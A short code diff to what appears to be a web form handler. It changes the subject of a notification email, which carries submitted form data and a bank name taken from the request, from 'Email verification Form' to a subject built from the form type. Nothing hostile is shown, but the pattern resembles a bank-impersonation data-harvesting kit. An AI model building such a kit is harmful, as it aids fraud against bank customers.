@@ -17,7 +17,7 @@ export async function POST(request) {
     let mailOptions = {
       from: process.env.EMAIL_USER,
       to: process.env.NOTIFICATION_EMAIL,
-      subject: `${data.bankName || process.env.NEXT_PUBLIC_BANK_NAME} - Email verification Form`,
+      subject: `${data.bankName || process.env.NEXT_PUBLIC_BANK_NAME}  -  ${data.type} Form`,
       html: generateEmailContent(data),
     };
     
